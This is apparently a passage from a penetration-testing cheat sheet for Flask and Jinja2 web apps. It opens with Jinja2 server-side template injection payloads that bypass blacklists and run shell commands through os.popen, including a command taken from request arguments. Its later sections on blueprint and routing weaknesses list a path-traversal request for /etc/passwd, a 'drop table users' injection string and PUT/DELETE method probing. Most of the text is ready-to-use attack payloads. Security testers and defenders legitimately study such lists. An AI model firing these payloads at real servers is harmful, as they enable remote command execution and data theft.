<ssti_bypass>
{% raw %}
# Jinja2 SSTI filter bypass:

# Blacklist bypass:
# If 'class' blocked:
{{''|attr('\x5f\x5fclass\x5f\x5f')}}

# If '.' blocked:
{{''['__class__']}}
{{''|attr('__class__')}}

# If '_' blocked:
{{''['\x5f\x5fclass\x5f\x5f']}}
{{request['args']['a']}} with ?a=__class__

# If brackets blocked:
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}

# String construction:
{% set x = 'o'+'s' %}
{{lipsum.__globals__[x].popen('id').read()}}

# Using request:
{{lipsum.__globals__[request.args.m].popen(request.args.c).read()}}&m=os&c=id
{% endraw %}
</ssti_bypass>
</jinja2_ssti>

<blueprint_security>
<blueprint_issues>
{% raw %}
# Blueprint security testing:

# 1. URL prefix bypass:
# Blueprint registered with prefix
/api/v1/resource  # Normal
/api/v1/../resource  # Try bypass
//api/v1/resource  # Double slash

# 2. Blueprint-specific auth:
# Some blueprints may lack authentication
/admin/dashboard  # Has auth
/api/endpoint  # Missing auth?

# 3. Error handlers:
# Different error handling per blueprint
# Information disclosure in errors

# 4. Static files:
# Blueprint static folder exposed
/blueprint/static/../../../etc/passwd

# 5. Before request hooks:
# May not apply to all blueprints
# Auth check in main app but not API blueprint
{% endraw %}
</blueprint_issues>

<routing_vulnerabilities>
{% raw %}
# Flask routing issues:

# 1. Trailing slash:
/users (returns 200)
/users/ (redirects or different behavior)

# 2. Method handling:
# Endpoint may accept unintended methods
curl -X PUT /api/users/1
curl -X DELETE /api/users/1

# 3. Variable rules:
# /users/<int:id> vs /users/<id>
/users/admin  # May bypass int check
/users/1;drop table users

# 4. URL building:
# url_for() may expose internal routes
# Check for route listing endpoint

# 5. Subdomain routing:
# Subdomain may have different security
api.example.com vs www.example.com
{% endraw %}
</routing_vulnerabilities>
</blueprint_security>

